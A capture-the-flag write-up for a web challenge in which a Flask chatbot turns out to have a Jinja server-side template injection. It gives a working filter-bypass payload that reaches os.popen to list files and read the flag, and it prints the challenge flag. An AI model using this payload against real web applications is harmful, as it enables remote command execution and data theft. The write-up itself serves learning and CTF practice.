## This is a writeup for the Unintelligible-Chatbot challenge in Web category

We get this chatbot which have only 2-3 responses.
![image](https://github.com/ayu-ch/backdoorCTF-23/assets/137001939/6ec7acc9-dc7d-46ba-bb60-ed9b2e2dcb10)

My first thought was trying xss,
![image](https://github.com/ayu-ch/backdoorCTF-23/assets/137001939/31fac526-6d8f-4faa-aaf0-20572ba91fd9)
turns out it didnt work.

If we try to typing some characters like '%,#,.' we can see they're blacklisted
![image](https://github.com/ayu-ch/backdoorCTF-23/assets/137001939/bd61dd52-fc36-43c3-a667-03d189b9225c)

Then i got to know it uses flask, so i tried some jinja 
![image](https://github.com/ayu-ch/backdoorCTF-23/assets/137001939/c2f5cfca-b254-4059-98f7-e5e31466447b)
We get this following output, 
![image](https://github.com/ayu-ch/backdoorCTF-23/assets/137001939/a3487672-046f-4ec2-a21d-a1213dc265cd)

i was confirmed this had SSTI(server-side-template-injection) vuln using jinja.

So i tried the following payload:
>{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}

We get this:
![image](https://github.com/ayu-ch/backdoorCTF-23/assets/137001939/3c82198a-f6c3-4846-a287-bc5736fe02ea)

We can see there's a file called flag.
changing 'ls' to 'cat flag' 

>{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}

we get the flag!
![image](https://github.com/ayu-ch/backdoorCTF-23/assets/137001939/9814bc8f-4b44-4ace-a4ba-b90c905584ec)

```flag{n07_4n07h3r_5571_ch4ll3n63}```

Happy Hacking!


